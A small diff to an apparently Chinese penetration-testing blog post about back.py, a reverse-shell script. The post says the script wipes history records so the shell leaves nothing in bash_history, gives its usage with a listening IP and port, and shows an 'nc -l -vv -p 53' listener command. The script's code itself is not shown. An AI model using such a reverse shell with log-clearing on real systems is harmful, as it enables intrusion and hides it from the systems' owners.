@@ -9,6 +9,11 @@ categories: 渗透
 ---
 
 back.py会自动去掉各种history记录，确保shell断掉的时候不会被记录到bash_history里面，而且反弹也稳定不会断，推荐使用
+
+<!-- more -->
+
+
+back.py会自动去掉各种history记录，确保shell断掉的时候不会被记录到bash_history里面，而且反弹也稳定不会断，推荐使用
 使用方法：back.py 你本地监听的IP 端口 [udp]
 
 首先本地使用nc监听：nc -l -vv -p 53
@@ -71,3 +76,5 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+
